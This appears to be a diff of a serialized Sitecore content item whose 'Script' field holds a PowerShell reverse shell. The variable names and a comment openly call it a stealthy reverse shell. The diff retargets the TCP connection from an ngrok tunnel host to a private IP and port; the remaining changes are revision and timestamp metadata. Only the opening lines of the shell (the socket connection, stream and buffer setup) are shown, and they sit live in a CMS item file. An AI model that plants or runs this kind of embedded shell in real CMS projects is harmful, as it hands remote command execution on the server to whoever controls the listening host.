@@ -7,7 +7,7 @@ SharedFields:
 - ID: "b1a94ff0-6897-47c0-9c51-aa6acb80b1f0"
   Hint: Script
   Value: |
-    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("4.tcp.eu.ngrok.io", 16114);
+    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("172.23.169.33", 9003);
     $reverseShellStream = $reverseShellClient.GetStream();
     # Generate a stealh reverse shell
     [byte[]]$reverseShellBytes = 0..65535|%{0};
@@ -40,11 +40,11 @@ Languages:
         sitecore\bas.lijten@gmail.com
     - ID: "8cdc337e-a112-42fb-bbb4-4143751e123f"
       Hint: __Revision
-      Value: "5fc0e7e5-62c7-4ff1-95dd-e343127ba54c"
+      Value: "4b089c26-08b7-4472-b2eb-d151a22ca715"
     - ID: "badd9cf9-53e0-4d0c-bcc0-2d784c282f6a"
       Hint: __Updated by
       Value: |
         sitecore\bas.lijten@gmail.com
     - ID: "d9cf14b1-fa16-4ba6-9288-e8a174d4d522"
       Hint: __Updated
-      Value: 20230614T153451Z
+      Value: 20230620T205438Z
